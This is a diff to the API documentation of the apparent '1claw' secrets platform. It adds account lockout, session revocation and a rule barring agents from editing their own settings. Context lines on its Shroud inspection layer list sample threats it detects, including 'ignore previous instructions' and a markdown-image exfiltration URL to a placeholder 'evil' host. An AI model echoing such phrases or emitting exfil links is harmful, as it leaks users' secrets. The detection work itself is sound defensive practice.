@@ -200,6 +200,8 @@ Tokens starting with `1ck_` (human personal API keys) or `ocv_` (agent API keys)
 - Dashboard: **Forgot password?** on the login page → email link → `/reset-password?token=…`.
 - API: `POST /v1/auth/forgot-password` `{ "email" }` and `POST /v1/auth/reset-password` `{ "token", "new_password" }` (public; forgot returns a generic message).
 - CLI: `1claw forgot-password`, `1claw reset-password` (use `--api-url` for self-hosted).
+- **Session revocation on password change/reset:** Both `change-password` and `reset-password` invalidate all existing JWTs for the user (`revoked_before` timestamp). Any previously issued token returns 401.
+- **Account lockout:** 10 consecutive failed login attempts lock the account for 15 minutes. The lockout is per-user and resets on successful login.
 
 ### Shroud & Intents hosts
 
@@ -472,7 +474,7 @@ Base URL: `https://api.1claw.xyz`. All authenticated endpoints require `Authoriz
 | `GET`    | `/v1/agents`                           | List agents → `{ agents: [...] }`                                          |
 | `GET`    | `/v1/agents/{id}`                      | Get agent                                                                  |
 | `GET`    | `/v1/agents/me`                        | Get current agent (self)                                                   |
-| `PATCH`  | `/v1/agents/{id}`                      | Update agent (is_active, scopes, intents_api_enabled, guardrails)          |
+| `PATCH`  | `/v1/agents/{id}`                      | Update agent (is_active, scopes, intents_api_enabled, guardrails) — **user-only; agents cannot PATCH their own record** |
 | `DELETE` | `/v1/agents/{id}`                      | Delete agent → `204`                                                       |
 | `POST`   | `/v1/agents/{id}/rotate-key`           | Rotate agent API key → `{ api_key: "ocv_..." }`                            |
 | `POST`   | `/v1/agents/{id}/rotate-identity-keys` | Rotate agent SSH + ECDH keypairs (user-only; keys in `__agent-keys` vault) |
@@ -820,7 +822,7 @@ Multi-layered detection for prompt injection, command injection, social engineer
 | `sanitization_mode`            | string | `"block"` (reject threats), `"surgical"` (strip), `"log_only"` (log) |
 | `threat_logging`               | boolean| Log detected threats for audit (default: true)                      |
 
-**Extended inspection pipeline** — Beyond the threat detectors above, `shroud_config` also supports: `tool_call_inspection` (scan function/tool call arguments, block credential exfiltration), `output_policy` (block harmful content, patterns, and entities in LLM responses), `secret_injection_detection` (detect secrets injected into prompts/responses), `advanced_redaction` (detect base64-encoded, split, or prefix-leaked secrets), and `semantic_policy` (enforce allowed/denied topics and tasks at the intent level). `flagged_request_retention_days` controls how long flagged requests are retained. Dashboard: `/shroud-activity` (overview), `/shroud-activity/threats`, `/shroud-activity/live` (real-time inspector).
+**Extended inspection pipeline** — Beyond the threat detectors above, `shroud_config` also supports: `tool_call_inspection` (scan function/tool call arguments, block credential exfiltration — `block_credential_exfil` defaults to **`true`**), `output_policy` (block harmful content, patterns, and entities in LLM responses), `secret_injection_detection` (detect secrets injected into prompts/responses), `advanced_redaction` (detect base64-encoded, split, or prefix-leaked secrets), and `semantic_policy` (enforce allowed/denied topics and tasks at the intent level). `flagged_request_retention_days` controls how long flagged requests are retained. Dashboard: `/shroud-activity` (overview), `/shroud-activity/threats`, `/shroud-activity/live` (real-time inspector).
 
 **Bi-directional inspection (Shroud v0.5.0+)** — The inspection pipeline runs on the LLM **response** as well as the request. Response-side detectors catch: echoed / indirect prompt injection (model paraphrases "ignore previous instructions"), markdown-image exfil (`![x](https://evil/?token=…)`), data-URI exec blobs (`data:text/html;base64,…`), unexpected fenced code blocks (when `semantic_policy.allowed_tasks` does not include `code`), and exfil URLs in model output. Populates new audit fields: `response_injection_score`, `response_context_injection_score`, `response_injection_categories`, `external_urls_flagged`, `unexpected_code_blocks`. Default action: `Block` when score ≥ 0.7 and `output_policy.action = "block"`.
 
@@ -965,6 +967,10 @@ When many agents operate in the same organization:
 - **KMS key rotation scheduling:** GCP KMS keys support scheduled automatic rotation; production uses HSM protection level (`protection_level: 2`).
 - **CRC32C integrity verification:** KMS encrypt/decrypt responses are verified with CRC32C checksums to detect data corruption in transit.
 - **Audit insert hardening:** Direct `INSERT` on `audit_events` is revoked from the application DB role; all audit writes go through a `SECURITY DEFINER` function (`insert_audit_event`) to prevent RLS bypass.
+- **Account lockout:** 10 failed login attempts → 15-minute lock per user; resets on success.
+- **Session revocation:** Password change or reset invalidates all existing JWTs for the user (`revoked_before` column).
+- **Agent self-update guard:** Agents cannot `PATCH /v1/agents/{id}` on their own record — only human callers can modify agent settings.
+- **x402 unauthenticated amount verification:** The x402 middleware verifies payment amounts even for unauthenticated requests, preventing underpayment on public paid routes.
 - **Request body limit:** 5MB max; larger requests return 413.
 
 ---
@@ -984,7 +990,7 @@ When many agents operate in the same organization:
 | 410  | Gone                                                       | Secret expired or max access count reached — ask user to store a new version                                                                                                                      |
 | 422  | Validation error or simulation reverted                    | Check input. For `simulate_first`: transaction would revert                                                                                                                                       |
 | 413  | Payload too large                                          | Request body over 5MB — reduce payload size                                                                                                                                                       |
-| 429  | Rate limited                                               | Wait and retry. Auth routes: 5 req burst, 1/sec. Share creation: 10/min/org                                                                                                                       |
+| 429  | Rate limited / account locked                              | Wait and retry. Auth routes: 5 req burst, 1/sec. Share creation: 10/min/org. Login lockout: 15 min after 10 failed attempts                                                                       |
 
 All error responses include a `detail` field with a human-readable message.
 
